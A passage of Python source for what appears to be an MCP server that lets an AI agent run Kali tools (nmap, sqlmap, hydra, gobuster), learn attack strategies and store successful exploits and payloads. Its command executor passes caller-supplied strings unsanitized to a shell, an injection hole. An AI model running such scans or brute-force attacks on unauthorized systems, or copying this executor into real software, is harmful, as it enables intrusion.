            reasoning_parts.append("目标特征高度匹配")

        if details["historical_performance"] > 0.6:
            reasoning_parts.append("历史表现优秀")

        if details["similarity_bonus"] > 0.3:
            reasoning_parts.append("发现相似成功案例")

        if details["learning_adjustment"] > 0.2:
            reasoning_parts.append("用户意图高度匹配")

        if not reasoning_parts:
            reasoning_parts.append("基于当前上下文的综合分析")

        return ", ".join(reasoning_parts)

    def _identify_primary_factors(self, features: List[float]) -> List[str]:
        """识别主要影响因素"""
        factors = []

        if features[0] > 0.5:  # Web指标
            factors.append("Web应用特征显著")
        if features[1] > 0.5:  # IP目标
            factors.append("网络目标检测")
        if features[5] > 0.3:  # 端口数量
            factors.append("多端口开放")
        if features[9] > 0.2:  # 漏洞数量
            factors.append("已知漏洞存在")
        if features[17] > 0.6:  # 环境复杂度
            factors.append("复杂环境结构")

        return factors[:3]  # 返回前3个主要因素

    def _assess_risk_level(self, features: List[float]) -> str:
        """评估风险等级"""
        risk_score = 0.0

        # WAF检测
        if features[10] > 0.5:
            risk_score += 0.3

        # SSL启用
        if features[12] > 0.5:
            risk_score += 0.2

        # 环境复杂度
        risk_score += features[17] * 0.3

        # 响应时间（可能表示监控）
        if features[11] > 0.5:
            risk_score += 0.2

        if risk_score < 0.3:
            return "低风险"
        elif risk_score < 0.6:
            return "中等风险"
        else:
            return "高风险"

    def _estimate_resource_requirements(self, strategy_name: str) -> Dict[str, Any]:
        """估算资源需求"""
        requirements = {
            "ctf_quick_solve": {
                "estimated_time": "5-15分钟",
                "cpu_intensity": "低",
                "bandwidth_usage": "低",
                "tool_count": "3-5个"
            },
            "network_recon": {
                "estimated_time": "15-30分钟",
                "cpu_intensity": "中",
                "bandwidth_usage": "中",
                "tool_count": "4-7个"
            },
            "web_comprehensive": {
                "estimated_time": "30-60分钟",
                "cpu_intensity": "高",
                "bandwidth_usage": "高",
                "tool_count": "6-10个"
            },
            "pwn_exploitation": {
                "estimated_time": "20-45分钟",
                "cpu_intensity": "高",
                "bandwidth_usage": "低",
                "tool_count": "4-8个"
            },
            "adaptive_multi": {
                "estimated_time": "45-90分钟",
                "cpu_intensity": "很高",
                "bandwidth_usage": "高",
                "tool_count": "8-15个"
            }
        }

        return requirements.get(strategy_name, requirements["adaptive_multi"])

    def update_strategy_performance(self, strategy_name: str, success_rate: float,
                                  target_type: str = None, context: Dict[str, Any] = None):
        """更新策略性能记录"""

        # 更新全局性能历史
        if strategy_name not in self.strategy_performance_history:
            self.strategy_performance_history[strategy_name] = []

        self.strategy_performance_history[strategy_name].append(success_rate)

        # 保持历史记录在合理范围内
        if len(self.strategy_performance_history[strategy_name]) > 100:
            self.strategy_performance_history[strategy_name] = \
                self.strategy_performance_history[strategy_name][-100:]

        # 更新目标类型特定的性能
        if target_type:
            if target_type not in self.target_type_patterns:
                self.target_type_patterns[target_type] = {}

            if strategy_name not in self.target_type_patterns[target_type]:
                self.target_type_patterns[target_type][strategy_name] = []

            self.target_type_patterns[target_type][strategy_name].append(success_rate)

            # 保持记录在合理范围内
            if len(self.target_type_patterns[target_type][strategy_name]) > 50:
                self.target_type_patterns[target_type][strategy_name] = \
                    self.target_type_patterns[target_type][strategy_name][-50:]

        # 存储上下文向量用于相似性匹配
        if context:
            context_id = f"{strategy_name}_{int(time.time())}"
            self.target_vectors[context_id] = {
                **context,
                "successful_strategy": strategy_name,
                "success_rate": success_rate,
                "timestamp": datetime.now().isoformat()
            }

        # 应用强化学习更新权重
        self._update_strategy_weights(strategy_name, success_rate, target_type)

    def _update_strategy_weights(self, strategy_name: str, success_rate: float, target_type: str = None):
        """使用强化学习更新策略权重"""
        if strategy_name not in self.strategy_weights:
            return

        # 计算奖励信号
        reward = (success_rate - 0.5) * 2  # 将0-1转换为-1到1的奖励

        # 使用简单的梯度上升更新权重
        for factor, current_weight in self.strategy_weights[strategy_name].items():
            adjustment = self.learning_rate * reward * current_weight
            new_weight = current_weight + adjustment

            # 保持权重在合理范围内
            self.strategy_weights[strategy_name][factor] = max(0.1, min(new_weight, 0.9))

        # 重新标准化权重
        total_weight = sum(self.strategy_weights[strategy_name].values())
        for factor in self.strategy_weights[strategy_name]:
            self.strategy_weights[strategy_name][factor] /= total_weight

    def get_performance_analytics(self) -> Dict[str, Any]:
        """获取性能分析报告"""
        analytics = {
            "strategy_performance_overview": {},
            "target_type_insights": {},
            "learning_progress": {},
            "optimization_recommendations": []
        }

        # 策略性能概览
        for strategy, history in self.strategy_performance_history.items():
            if history:
                analytics["strategy_performance_overview"][strategy] = {
                    "average_success_rate": sum(history) / len(history),
                    "recent_trend": sum(history[-10:]) / len(history[-10:]) if len(history) >= 10 else sum(history) / len(history),
                    "total_executions": len(history),
                    "best_performance": max(history),
                    "worst_performance": min(history),
                    "stability": 1.0 - (max(history) - min(history))  # 稳定性指标
                }

        # 目标类型洞察
        for target_type, strategies in self.target_type_patterns.items():
            analytics["target_type_insights"][target_type] = {
                "best_strategy": max(strategies.items(), key=lambda x: sum(x[1]) / len(x[1]))[0] if strategies else None,
                "strategy_effectiveness": {
                    strategy: sum(performance) / len(performance)
                    for strategy, performance in strategies.items()
                }
            }

        # 学习进展
        total_sessions = sum(len(history) for history in self.strategy_performance_history.values())
        analytics["learning_progress"] = {
            "total_learning_sessions": total_sessions,
            "strategies_learned": len(self.strategy_performance_history),
            "target_types_analyzed": len(self.target_type_patterns),
            "confidence_improvement": self._calculate_confidence_improvement()
        }

        # 优化建议
        analytics["optimization_recommendations"] = self._generate_optimization_recommendations()

        return analytics

    def _calculate_confidence_improvement(self) -> float:
        """计算置信度改进程度"""
        if not self.strategy_performance_history:
            return 0.0

        improvements = []
        for strategy, history in self.strategy_performance_history.items():
            if len(history) >= 10:
                early_avg = sum(history[:5]) / 5
                recent_avg = sum(history[-5:]) / 5
                improvement = recent_avg - early_avg
                improvements.append(improvement)

        return sum(improvements) / len(improvements) if improvements else 0.0

    def _generate_optimization_recommendations(self) -> List[Dict[str, str]]:
        """生成优化建议"""
        recommendations = []

        # 分析策略性能
        for strategy, history in self.strategy_performance_history.items():
            if history:
                avg_performance = sum(history) / len(history)
                if avg_performance < 0.4:
                    recommendations.append({
                        "type": "strategy_improvement",
                        "strategy": strategy,
                        "recommendation": f"{strategy}策略表现较差，建议调整权重或增加训练数据",
                        "priority": "high"
                    })
                elif avg_performance > 0.8:
                    recommendations.append({
                        "type": "strategy_expansion",
                        "strategy": strategy,
                        "recommendation": f"{strategy}策略表现优秀，建议扩展到更多场景",
                        "priority": "medium"
                    })

        # 数据不足警告
        low_data_strategies = [s for s, h in self.strategy_performance_history.items() if len(h) < 10]
        if low_data_strategies:
            recommendations.append({
                "type": "data_collection",
                "strategies": low_data_strategies,
                "recommendation": "部分策略缺乏足够的训练数据，建议增加测试频率",
                "priority": "medium"
            })

        return recommendations

# 全局ML策略优化器实例
ml_strategy_optimizer = MLStrategyOptimizer()

# ==================== 高级内存持久化系统 ====================

class AdvancedMemoryPersistence:
    """高级内存持久化系统 - 使用向量存储实现长期记忆"""

    def __init__(self):
        self.vector_storage = {}  # 主向量存储
        self.memory_clusters = {}  # 内存聚类
        self.session_embeddings = {}  # 会话嵌入
        self.knowledge_graph = {}  # 知识图谱

        # 持久化配置
        self.max_memory_entries = 10000
        self.similarity_threshold = 0.7
        self.cluster_update_frequency = 100  # 每100个条目更新一次聚类
        self.entry_counter = 0

        # 记忆类型权重
        self.memory_weights = {
            "vulnerability_discovery": 1.0,
            "successful_exploit": 0.9,
            "tool_effectiveness": 0.8,
            "target_characteristics": 0.7,
            "strategy_outcome": 0.6,
            "conversation_context": 0.5
        }

    def store_memory(self, memory_type: str, content: Dict[str, Any],
                    session_context: SessionContext = None) -> str:
        """存储记忆到向量存储系统"""

        memory_id = f"{memory_type}_{int(time.time())}_{random.randint(1000, 9999)}"

        # 创建记忆条目
        memory_entry = {
            "id": memory_id,
            "type": memory_type,
            "content": content,
            "timestamp": datetime.now().isoformat(),
            "session_id": session_context.session_id if session_context else None,
            "importance_score": self._calculate_importance(memory_type, content),
            "access_count": 0,
            "last_accessed": datetime.now().isoformat(),
            "decay_factor": 1.0
        }

        # 生成向量嵌入
        embedding_vector = self._generate_embedding(memory_entry)
        memory_entry["embedding"] = embedding_vector

        # 存储到向量存储
        self.vector_storage[memory_id] = memory_entry

        # 更新知识图谱
        self._update_knowledge_graph(memory_entry, session_context)

        # 检查是否需要聚类更新
        self.entry_counter += 1
        if self.entry_counter % self.cluster_update_frequency == 0:
            self._update_memory_clusters()

        # 清理旧记忆（如果超过限制）
        self._cleanup_old_memories()

        logger.info(f"Stored memory: {memory_id} (type: {memory_type})")
        return memory_id

    def retrieve_similar_memories(self, query_context: Dict[str, Any],
                                memory_types: List[str] = None,
                                limit: int = 10) -> List[Dict[str, Any]]:
        """检索相似记忆"""

        # 生成查询向量
        query_vector = self._generate_query_embedding(query_context)

        # 计算相似度分数
        similarities = []

        for memory_id, memory_entry in self.vector_storage.items():
            # 类型过滤
            if memory_types and memory_entry["type"] not in memory_types:
                continue

            # 计算余弦相似度
            similarity = self._cosine_similarity(query_vector, memory_entry["embedding"])

            # 应用时间衰减
            time_factor = self._calculate_time_decay(memory_entry["timestamp"])

            # 应用重要性权重
            importance_factor = memory_entry["importance_score"]

            # 应用访问频率加权
            access_factor = min(1.0 + memory_entry["access_count"] * 0.1, 2.0)

            final_score = similarity * time_factor * importance_factor * access_factor

            if final_score >= self.similarity_threshold:
                similarities.append({
                    "memory_id": memory_id,
                    "memory": memory_entry,
                    "similarity_score": similarity,
                    "final_score": final_score
                })

        # 排序并返回前N个结果
        similarities.sort(key=lambda x: x["final_score"], reverse=True)
        results = similarities[:limit]

        # 更新访问计数
        for result in results:
            memory_id = result["memory_id"]
            self.vector_storage[memory_id]["access_count"] += 1
            self.vector_storage[memory_id]["last_accessed"] = datetime.now().isoformat()

        return results

    def get_contextual_insights(self, session_context: SessionContext) -> Dict[str, Any]:
        """基于当前上下文获取洞察"""

        insights = {
            "relevant_vulnerabilities": [],
            "successful_techniques": [],
            "similar_targets": [],
            "recommended_approaches": [],
            "risk_indicators": []
        }

        # 构建查询上下文
        query_context = {
            "target": session_context.target,
            "attack_mode": session_context.attack_mode,
            "discovered_assets": session_context.discovered_assets,
            "completed_tasks": session_context.completed_tasks
        }

        # 检索相关漏洞记忆
        vuln_memories = self.retrieve_similar_memories(
            query_context,
            memory_types=["vulnerability_discovery"],
            limit=5
        )

        for memory in vuln_memories:
            insights["relevant_vulnerabilities"].append({
                "vulnerability": memory["memory"]["content"].get("vulnerability_type"),
                "target_similarity": memory["similarity_score"],
                "exploitation_success": memory["memory"]["content"].get("exploitation_success", False),
                "tools_used": memory["memory"]["content"].get("tools_used", [])
            })

        # 检索成功技术
        exploit_memories = self.retrieve_similar_memories(
            query_context,
            memory_types=["successful_exploit"],
            limit=5
        )

        for memory in exploit_memories:
            insights["successful_techniques"].append({
                "technique": memory["memory"]["content"].get("technique"),
                "success_rate": memory["memory"]["content"].get("success_rate", 0),
                "target_type": memory["memory"]["content"].get("target_type"),
                "payload": memory["memory"]["content"].get("payload")
            })

        # 检索相似目标
        target_memories = self.retrieve_similar_memories(
            query_context,
            memory_types=["target_characteristics"],
            limit=3
        )

        for memory in target_memories:
            insights["similar_targets"].append({
                "target": memory["memory"]["content"].get("target"),
                "characteristics": memory["memory"]["content"].get("characteristics"),
                "successful_strategies": memory["memory"]["content"].get("successful_strategies", []),
                "discovery_methods": memory["memory"]["content"].get("discovery_methods", [])
            })

        # 生成推荐方法
        insights["recommended_approaches"] = self._generate_contextual_recommendations(
            session_context, vuln_memories, exploit_memories
        )

        # 识别风险指标
        insights["risk_indicators"] = self._identify_risk_indicators(
            session_context, insights["relevant_vulnerabilities"]
        )

        return insights

    def store_vulnerability_discovery(self, vulnerability_info: Dict[str, Any],
                                   session_context: SessionContext) -> str:
        """存储漏洞发现记忆"""

        content = {
            "vulnerability_type": vulnerability_info.get("type"),
            "severity": vulnerability_info.get("severity"),
            "target": session_context.target,
            "discovery_method": vulnerability_info.get("discovery_method"),
            "tools_used": vulnerability_info.get("tools_used", []),
            "exploitation_success": vulnerability_info.get("exploited", False),
            "mitigation_present": vulnerability_info.get("mitigation_present", False),
            "target_characteristics": {
                "target_type": ml_strategy_optimizer._classify_target_type(session_context.target),
                "discovered_services": list(session_context.discovered_assets.keys()),
                "environment_complexity": len(session_context.discovered_assets)
            }
        }

        return self.store_memory("vulnerability_discovery", content, session_context)

    def store_successful_exploit(self, exploit_info: Dict[str, Any],
                               session_context: SessionContext) -> str:
        """存储成功利用记忆"""

        content = {
            "technique": exploit_info.get("technique"),
            "payload": exploit_info.get("payload"),
            "success_rate": exploit_info.get("success_rate", 1.0),
            "target_type": ml_strategy_optimizer._classify_target_type(session_context.target),
            "preconditions": exploit_info.get("preconditions", []),
            "side_effects": exploit_info.get("side_effects", []),
            "tools_used": exploit_info.get("tools_used", []),
            "execution_time": exploit_info.get("execution_time"),
            "target_response": exploit_info.get("target_response")
        }

        return self.store_memory("successful_exploit", content, session_context)

    def store_tool_effectiveness(self, tool_name: str, effectiveness_data: Dict[str, Any],
                               session_context: SessionContext) -> str:
        """存储工具有效性记忆"""

        content = {
            "tool_name": tool_name,
            "effectiveness_score": effectiveness_data.get("score", 0.5),
            "execution_time": effectiveness_data.get("execution_time"),
            "resource_usage": effectiveness_data.get("resource_usage"),
            "success_indicators": effectiveness_data.get("success_indicators", []),
            "failure_reasons": effectiveness_data.get("failure_reasons", []),
            "target_characteristics": {
                "target": session_context.target,
                "target_type": ml_strategy_optimizer._classify_target_type(session_context.target),
                "complexity": len(session_context.discovered_assets)
            },
            "context_factors": effectiveness_data.get("context_factors", [])
        }

        return self.store_memory("tool_effectiveness", content, session_context)

    def _generate_embedding(self, memory_entry: Dict[str, Any]) -> List[float]:
        """生成记忆条目的向量嵌入"""

        # 初始化50维嵌入向量
        embedding = [0.0] * 50

        content = memory_entry["content"]
        memory_type = memory_entry["type"]

        # 基础特征 (0-9)
        if "target" in content:
            target = content["target"].lower() if content["target"] else ""
            embedding[0] = 1.0 if "http" in target or "www" in target else 0.0  # Web服务
            embedding[1] = 1.0 if re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', target) else 0.0  # IP
            embedding[2] = len(target) / 100.0  # 目标名称长度标准化

        # 记忆类型编码 (10-14)
        type_encoding = {
            "vulnerability_discovery": [1.0, 0.0, 0.0, 0.0, 0.0],
            "successful_exploit": [0.0, 1.0, 0.0, 0.0, 0.0],
            "tool_effectiveness": [0.0, 0.0, 1.0, 0.0, 0.0],
            "target_characteristics": [0.0, 0.0, 0.0, 1.0, 0.0],
            "strategy_outcome": [0.0, 0.0, 0.0, 0.0, 1.0]
        }
        type_vec = type_encoding.get(memory_type, [0.0, 0.0, 0.0, 0.0, 0.0])
        embedding[10:15] = type_vec

        # 严重性/重要性特征 (15-17)
        if "severity" in content:
            severity_map = {"low": 0.2, "medium": 0.5, "high": 0.8, "critical": 1.0}
            embedding[15] = severity_map.get(content["severity"], 0.5)

        if "success_rate" in content:
            embedding[16] = content["success_rate"]

        embedding[17] = memory_entry["importance_score"]

        # 工具特征 (18-27)
        if "tools_used" in content:
            tools = content["tools_used"]
            tool_features = {
                "nmap": 18, "gobuster": 19, "sqlmap": 20, "nuclei": 21, "nikto": 22,
                "metasploit": 23, "burp": 24, "wireshark": 25, "john": 26, "hashcat": 27
            }
            for tool in tools:
                for tool_name, index in tool_features.items():
                    if tool_name in tool.lower():
                        embedding[index] = 1.0

        # 目标特征 (28-37)
        if "target_characteristics" in content:
            char = content["target_characteristics"]
            embedding[28] = char.get("environment_complexity", 0) / 20.0  # 标准化复杂度

            # 目标类型特征
            target_type = char.get("target_type", "unknown")
            type_features = {
                "web_application": 29, "ip_address": 30, "binary_file": 31,
                "complex_endpoint": 32, "network_range": 33
            }
            if target_type in type_features:
                embedding[type_features[target_type]] = 1.0

        # 时间特征 (38-42)
        timestamp = datetime.fromisoformat(memory_entry["timestamp"])
        embedding[38] = timestamp.hour / 24.0  # 小时标准化
        embedding[39] = timestamp.weekday() / 7.0  # 星期标准化
        embedding[40] = timestamp.month / 12.0  # 月份标准化

        # 访问模式特征 (43-47)
        embedding[43] = min(memory_entry["access_count"] / 100.0, 1.0)  # 访问次数标准化
        embedding[44] = memory_entry["decay_factor"]

        # 上下文特征 (45-49)
        if "exploitation_success" in content:
            embedding[45] = 1.0 if content["exploitation_success"] else 0.0

        if "mitigation_present" in content:
            embedding[46] = 1.0 if content["mitigation_present"] else 0.0

        # 向量长度标准化
        vector_magnitude = sum(x*x for x in embedding) ** 0.5
        if vector_magnitude > 0:
            embedding = [x / vector_magnitude for x in embedding]

        return embedding

    def _generate_query_embedding(self, query_context: Dict[str, Any]) -> List[float]:
        """生成查询上下文的向量嵌入"""

        # 创建临时记忆条目用于生成嵌入
        temp_memory = {
            "content": query_context,
            "type": "query",
            "timestamp": datetime.now().isoformat(),
            "importance_score": 1.0,
            "access_count": 0,
            "decay_factor": 1.0
        }

        return self._generate_embedding(temp_memory)

    def _cosine_similarity(self, vec1: List[float], vec2: List[float]) -> float:
        """计算两个向量的余弦相似度"""

        if len(vec1) != len(vec2):
            return 0.0

        dot_product = sum(a * b for a, b in zip(vec1, vec2))
        magnitude1 = sum(a * a for a in vec1) ** 0.5
        magnitude2 = sum(b * b for b in vec2) ** 0.5

        if magnitude1 == 0 or magnitude2 == 0:
            return 0.0

        return dot_product / (magnitude1 * magnitude2)

    def _calculate_importance(self, memory_type: str, content: Dict[str, Any]) -> float:
        """计算记忆重要性分数"""

        base_importance = self.memory_weights.get(memory_type, 0.5)

        # 基于内容调整重要性
        importance_factors = []

        # 成功率因子
        if "success_rate" in content:
            importance_factors.append(content["success_rate"])

        # 严重性因子
        if "severity" in content:
            severity_scores = {"low": 0.3, "medium": 0.6, "high": 0.8, "critical": 1.0}
            importance_factors.append(severity_scores.get(content["severity"], 0.5))

        # 漏洞利用成功因子
        if "exploitation_success" in content and content["exploitation_success"]:
            importance_factors.append(1.0)

        # 工具数量因子
        if "tools_used" in content:
            tool_factor = min(len(content["tools_used"]) / 10.0, 1.0)
            importance_factors.append(tool_factor)

        # 计算最终重要性
        if importance_factors:
            avg_factor = sum(importance_factors) / len(importance_factors)
            final_importance = base_importance * 0.7 + avg_factor * 0.3
        else:
            final_importance = base_importance

        return min(max(final_importance, 0.1), 1.0)

    def _calculate_time_decay(self, timestamp_str: str) -> float:
        """计算时间衰减因子"""

        try:
            timestamp = datetime.fromisoformat(timestamp_str)
            now = datetime.now()
            time_diff = (now - timestamp).total_seconds()

            # 1小时内：无衰减 (1.0)
            # 1天内：轻微衰减 (0.9)
            # 1周内：中等衰减 (0.7)
            # 1月内：明显衰减 (0.5)
            # 更久：强衰减 (0.3)

            if time_diff < 3600:  # 1小时
                return 1.0
            elif time_diff < 86400:  # 1天
                return 0.9
            elif time_diff < 604800:  # 1周
                return 0.7
            elif time_diff < 2592000:  # 1月
                return 0.5
            else:
                return 0.3

        except:
            return 0.5

    def _update_knowledge_graph(self, memory_entry: Dict[str, Any],
                              session_context: SessionContext = None):
        """更新知识图谱"""

        content = memory_entry["content"]
        memory_id = memory_entry["id"]

        # 提取关键实体
        entities = []

        if "target" in content:
            entities.append(("target", content["target"]))

        if "vulnerability_type" in content:
            entities.append(("vulnerability", content["vulnerability_type"]))

        if "technique" in content:
            entities.append(("technique", content["technique"]))

        if "tools_used" in content:
            for tool in content["tools_used"]:
                entities.append(("tool", tool))

        # 更新知识图谱连接
        for entity_type, entity_value in entities:
            entity_key = f"{entity_type}:{entity_value}"

            if entity_key not in self.knowledge_graph:
                self.knowledge_graph[entity_key] = {
                    "type": entity_type,
                    "value": entity_value,
                    "connected_memories": [],
                    "connection_strength": {},
                    "last_updated": datetime.now().isoformat()
                }

            # 添加记忆连接
            if memory_id not in self.knowledge_graph[entity_key]["connected_memories"]:
                self.knowledge_graph[entity_key]["connected_memories"].append(memory_id)

            # 更新连接强度
            for other_entity_type, other_entity_value in entities:
                if entity_type != other_entity_type or entity_value != other_entity_value:
                    other_key = f"{other_entity_type}:{other_entity_value}"

                    if other_key not in self.knowledge_graph[entity_key]["connection_strength"]:
                        self.knowledge_graph[entity_key]["connection_strength"][other_key] = 0

                    self.knowledge_graph[entity_key]["connection_strength"][other_key] += 1

    def _update_memory_clusters(self):
        """更新记忆聚类"""

        logger.info("Updating memory clusters...")

        # 简单的K-means聚类实现
        if len(self.vector_storage) < 10:
            return

        # 提取所有嵌入向量
        embeddings = []
        memory_ids = []

        for memory_id, memory_entry in self.vector_storage.items():
            embeddings.append(memory_entry["embedding"])
            memory_ids.append(memory_id)

        # 确定聚类数量
        num_clusters = min(10, max(3, len(embeddings) // 20))

        # 初始化聚类中心
        import random
        cluster_centers = random.sample(embeddings, num_clusters)

        # 简单聚类分配
        clusters = {i: [] for i in range(num_clusters)}

        for i, embedding in enumerate(embeddings):
            best_cluster = 0
            best_similarity = -1

            for j, center in enumerate(cluster_centers):
                similarity = self._cosine_similarity(embedding, center)
                if similarity > best_similarity:
                    best_similarity = similarity
                    best_cluster = j

            clusters[best_cluster].append(memory_ids[i])

        # 更新聚类信息
        self.memory_clusters = {
            f"cluster_{i}": {
                "center": cluster_centers[i],
                "members": members,
                "size": len(members),
                "last_updated": datetime.now().isoformat()
            }
            for i, members in clusters.items() if members
        }

    def _cleanup_old_memories(self):
        """清理旧记忆以保持在限制范围内"""

        if len(self.vector_storage) <= self.max_memory_entries:
            return

        # 计算每个记忆的保留分数
        retention_scores = []

        for memory_id, memory_entry in self.vector_storage.items():
            # 基于重要性、访问频率和时间衰减计算保留分数
            importance = memory_entry["importance_score"]
            access_factor = min(1.0 + memory_entry["access_count"] * 0.1, 2.0)
            time_factor = self._calculate_time_decay(memory_entry["timestamp"])

            retention_score = importance * access_factor * time_factor
            retention_scores.append((memory_id, retention_score))

        # 按保留分数排序
        retention_scores.sort(key=lambda x: x[1], reverse=True)

        # 保留前N个记忆
        memories_to_keep = retention_scores[:self.max_memory_entries]
        keep_ids = set(memory_id for memory_id, _ in memories_to_keep)

        # 删除不需要保留的记忆
        memories_to_delete = [memory_id for memory_id in self.vector_storage.keys()
                            if memory_id not in keep_ids]

        for memory_id in memories_to_delete:
            del self.vector_storage[memory_id]

        logger.info(f"Cleaned up {len(memories_to_delete)} old memories")

    def _generate_contextual_recommendations(self, session_context: SessionContext,
                                          vuln_memories: List[Dict],
                                          exploit_memories: List[Dict]) -> List[Dict[str, Any]]:
        """基于记忆生成上下文推荐"""

        recommendations = []

        # 基于漏洞记忆的推荐
        for memory in vuln_memories[:3]:
            vuln_content = memory["memory"]["content"]
            if vuln_content.get("exploitation_success"):
                recommendations.append({
                    "type": "vulnerability_exploitation",
                    "priority": "high",
                    "description": f"类似目标存在{vuln_content.get('vulnerability_type')}漏洞",
                    "suggested_tools": vuln_content.get("tools_used", []),
                    "confidence": memory["similarity_score"]
                })

        # 基于成功利用记忆的推荐
        for memory in exploit_memories[:3]:
            exploit_content = memory["memory"]["content"]
            recommendations.append({
                "type": "exploitation_technique",
                "priority": "medium",
                "description": f"建议尝试{exploit_content.get('technique')}技术",
                "success_rate": exploit_content.get("success_rate", 0),
                "confidence": memory["similarity_score"]
            })

        return recommendations

    def _identify_risk_indicators(self, session_context: SessionContext,
                                relevant_vulns: List[Dict]) -> List[Dict[str, Any]]:
        """识别风险指标"""

        risk_indicators = []

        # 基于已知漏洞的风险
        high_severity_count = sum(1 for vuln in relevant_vulns
                                if vuln.get("vulnerability", {}).get("severity") in ["high", "critical"])

        if high_severity_count > 0:
            risk_indicators.append({
                "type": "high_severity_vulnerabilities",
                "level": "high",
                "description": f"发现{high_severity_count}个高危漏洞模式",
                "recommendation": "优先进行漏洞验证和利用"
            })

        # 基于目标复杂度的风险
        complexity = len(session_context.discovered_assets)
        if complexity > 10:
            risk_indicators.append({
                "type": "complex_environment",
                "level": "medium",
                "description": "目标环境复杂，可能存在未知风险",
                "recommendation": "采用分阶段深入分析策略"
            })

        return risk_indicators

    def export_memory_analytics(self) -> Dict[str, Any]:
        """导出记忆分析报告"""

        analytics = {
            "memory_statistics": {
                "total_memories": len(self.vector_storage),
                "memory_types": {},
                "cluster_count": len(self.memory_clusters),
                "knowledge_graph_entities": len(self.knowledge_graph)
            },
            "memory_distribution": {},
            "access_patterns": {},
            "retention_analysis": {},
            "knowledge_insights": []
        }

        # 记忆类型分布
        for memory_entry in self.vector_storage.values():
            memory_type = memory_entry["type"]
            if memory_type not in analytics["memory_statistics"]["memory_types"]:
                analytics["memory_statistics"]["memory_types"][memory_type] = 0
            analytics["memory_statistics"]["memory_types"][memory_type] += 1

        # 访问模式分析
        access_counts = [m["access_count"] for m in self.vector_storage.values()]
        if access_counts:
            analytics["access_patterns"] = {
                "average_access": sum(access_counts) / len(access_counts),
                "max_access": max(access_counts),
                "frequently_accessed": len([c for c in access_counts if c > 5])
            }

        # 知识洞察
        if self.knowledge_graph:
            # 找到最连接的实体
            most_connected = max(self.knowledge_graph.items(),
                               key=lambda x: len(x[1]["connected_memories"]))

            analytics["knowledge_insights"].append({
                "type": "most_connected_entity",
                "entity": most_connected[0],
                "connections": len(most_connected[1]["connected_memories"])
            })

        return analytics

# 全局高级内存持久化实例
advanced_memory = AdvancedMemoryPersistence()


# 全局AI上下文管理器实例
ai_context_manager = AIContextManager()

# Default configuration
DEFAULT_KALI_SERVER = "http://192.168.2.66:5000"  # 固定的Kali攻击机IP地址
DEFAULT_REQUEST_TIMEOUT = 10  # 10 seconds ultra fast timeout for API requests

# ==================== Local Command Executor ====================

import subprocess
from pathlib import Path

class LocalCommandExecutor:
    """本地命令执行器 - 直接使用subprocess执行Kali工具"""

    def __init__(self, timeout: int = 300, working_dir: str = None):
        """
        初始化本地命令执行器

        Args:
            timeout: 命令执行超时时间（秒）
            working_dir: 工作目录
        """
        self.timeout = timeout
        self.working_dir = working_dir or os.getcwd()
        logger.info(f"初始化本地命令执行器，工作目录: {self.working_dir}")

    def execute_command(self, command: str, timeout: int = None) -> Dict[str, Any]:
        """
        执行shell命令

        Args:
            command: 要执行的命令
            timeout: 命令超时时间（可选，覆盖默认值）

        Returns:
            执行结果字典
        """
        cmd_timeout = timeout or self.timeout

        try:
            logger.debug(f"执行命令: {command}")

            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=cmd_timeout,
                cwd=self.working_dir
            )

            success = result.returncode == 0

            return {
                "success": success,
                "output": result.stdout,
                "error": result.stderr if not success else "",
                "return_code": result.returncode,
                "command": command
            }

        except subprocess.TimeoutExpired:
            logger.warning(f"命令执行超时 ({cmd_timeout}秒): {command}")
            return {
                "success": False,
                "error": f"Command timeout after {cmd_timeout} seconds",
                "output": "",
                "return_code": -1,
                "command": command
            }
        except Exception as e:
            logger.error(f"命令执行失败: {command}, 错误: {str(e)}")
            return {
                "success": False,
                "error": str(e),
                "output": "",
                "return_code": -1,
                "command": command
            }

    def check_tool_available(self, tool_name: str) -> bool:
        """检查工具是否可用"""
        result = self.execute_command(f"which {tool_name}", timeout=5)
        return result["success"]

    def get_tool_version(self, tool_name: str) -> str:
        """获取工具版本"""
        result = self.execute_command(f"{tool_name} --version 2>&1 | head -1", timeout=5)
        return result["output"].strip() if result["success"] else "Unknown"

    def execute_tool_with_data(self, tool_name: str, data: Dict[str, Any]) -> Dict[str, Any]:
        """
        根据工具名称和数据字典执行工具命令

        Args:
            tool_name: 工具名称
            data: 工具参数字典

        Returns:
            执行结果
        """
        command = self._build_tool_command(tool_name, data)
        if not command:
            return {"success": False, "error": f"Unsupported tool: {tool_name}"}

        return self.execute_command(command)

    def _build_tool_command(self, tool_name: str, data: Dict[str, Any]) -> str:
        """构建工具命令"""
        if tool_name == "nmap":
            target = data.get("target", "")
            scan_type = data.get("scan_type", "-sV")
            ports = data.get("ports", "")
            additional_args = data.get("additional_args", "")
            cmd = f"nmap {scan_type} {target}"
            if ports:
                cmd += f" -p {ports}"
            if additional_args:
                cmd += f" {additional_args}"
            return cmd

        elif tool_name == "gobuster":
            url = data.get("url", "")
            mode = data.get("mode", "dir")
            wordlist = data.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
            additional_args = data.get("additional_args", "")
            return f"gobuster {mode} -u {url} -w {wordlist} {additional_args}"

        elif tool_name == "sqlmap":
            url = data.get("url", "")
            data_param = data.get("data", "")
            additional_args = data.get("additional_args", "")
            cmd = f"sqlmap -u {url}"
            if data_param:
                cmd += f" --data='{data_param}'"
            if additional_args:
                cmd += f" {additional_args}"
            return cmd

        elif tool_name == "nikto":
            target = data.get("target", "")
            additional_args = data.get("additional_args", "")
            return f"nikto -h {target} {additional_args}"

        elif tool_name == "hydra":
            target = data.get("target", "")
            service = data.get("service", "")
            username_list = data.get("username_list", "")
            password_list = data.get("password_list", "")
            additional_args = data.get("additional_args", "")
            return f"hydra -L {username_list} -P {password_list} {target} {service} {additional_args}"

        elif tool_name == "dirb":
            url = data.get("url", "")
            wordlist = data.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
            return f"dirb {url} {wordlist}"

        # 对于其他工具，返回通用命令
        return f"{tool_name} {' '.join(str(v) for v in data.values() if v)}"

# ==================== WebSocket Kali Client (将被删除) ====================

def setup_mcp_server() -> FastMCP:
    """
    Set up the MCP server with all tool functions

    Returns:
        Configured FastMCP instance
    """
    # 创建全局本地命令执行器
    global executor
    executor = LocalCommandExecutor(timeout=300)
    logger.info("本地命令执行器已初始化")

    mcp = FastMCP("kali-mcp")

    # ==================== 性能优化工具 ====================

    @mcp.tool()
    async def optimization_stats() -> Dict[str, Any]:
        """
        获取性能优化统计信息

        Returns:
            优化统计数据，包括连接池和缓存命中率
        """
